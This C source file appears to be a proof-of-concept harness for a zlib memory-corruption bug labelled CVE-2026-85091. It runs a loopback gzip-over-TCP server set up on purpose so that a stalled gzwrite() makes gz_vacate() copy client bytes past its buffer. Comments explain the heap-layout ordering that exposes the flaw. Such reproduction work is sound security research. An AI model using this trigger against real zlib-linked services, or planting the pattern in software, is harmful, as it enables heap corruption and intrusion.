/* zlib2shell — minimal gzip-over-TCP server for CVE-2026-85091.
 *
 * Plant-started 127.0.0.1 listener. One client connects and sends a request;
 * this server gzdopen()s the accepted non-blocking socket with a small send
 * buffer, reads the client's own bytes into a buffer allocated AFTER
 * gzdopen(), gzwrite()s those same bytes back as gzip, then gzclearerr() and
 * gzprintf(). When the peer stops reading, gz_write() stalls with EAGAIN and
 * leaves strm->next_in / strm->avail_in stale, so gz_vacate()'s memmove copies
 * peer-supplied bytes past state->in. zlib source is never edited here.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include "zlib.h"

#define REQ_MAX 100000u

int main(void) {
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0) return 2;
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = 0;
    if (bind(ls, (struct sockaddr *)&a, sizeof a) || listen(ls, 1)) return 2;
    socklen_t alen = sizeof a;
    if (getsockname(ls, (struct sockaddr *)&a, &alen)) return 2;
    printf("PORT=%d\n", (int)ntohs(a.sin_port));
    fflush(stdout);

    int fd = accept(ls, NULL, NULL);
    if (fd < 0) return 2;
    close(ls);

    /* 4 KiB send buffer (kernel doubles it) so a stopped peer forces EAGAIN
     * inside gzwrite(). The drain control raises it via TCP_SNDBUF: a 4 KiB
     * send buffer stalls even on a peer that is actively draining. */
    const char *sb = getenv("TCP_SNDBUF");
    int sndbuf = sb ? atoi(sb) : 4096;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof sndbuf);
    int fl = fcntl(fd, F_GETFL, 0);
    if (fl < 0 || fcntl(fd, F_SETFL, fl | O_NONBLOCK) < 0) return 2;

    gzFile gz = gzdopen(fd, "wb");
    if (!gz) return 2;

    /* Force gz_init() (and the gzip header) before the caller buffer exists:
     * state->in is allocated on the first gzwrite, and on glibc the undefined
     * relational guard in gz_vacate() only exposes the memmove when the caller
     * buffer sits ABOVE state->in. Allocating req here, before that first
     * write, would place it below state->in and skip the sink in plain builds. */
    unsigned char probe = 0x42;
    gzwrite(gz, &probe, 1);
    gzflush(gz, Z_SYNC_FLUSH);
    unsigned char *req = malloc(REQ_MAX);
    if (!req) return 2;

    size_t got = 0;
    while (got < REQ_MAX) {
        ssize_t r = read(fd, req + got, REQ_MAX - got);
        if (r > 0) { got += (size_t)r; continue; }
        if (r == 0) break;
        if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
            usleep(1000);
            continue;
        }
        break;
    }
    printf("REQ_BYTES=%zu\n", got);
    fflush(stdout);

    int written = gzwrite(gz, req, (unsigned)got);
    printf("WRITTEN=%d\n", written);
    fflush(stdout);

    gzclearerr(gz);
    int pr = gzprintf(gz, "x");
    printf("PRINTF_RC=%d\n", pr);
    fflush(stdout);
    gzclose(gz);
    free(req);
    printf("SERVER_DONE=1\n");
    return 0;
}
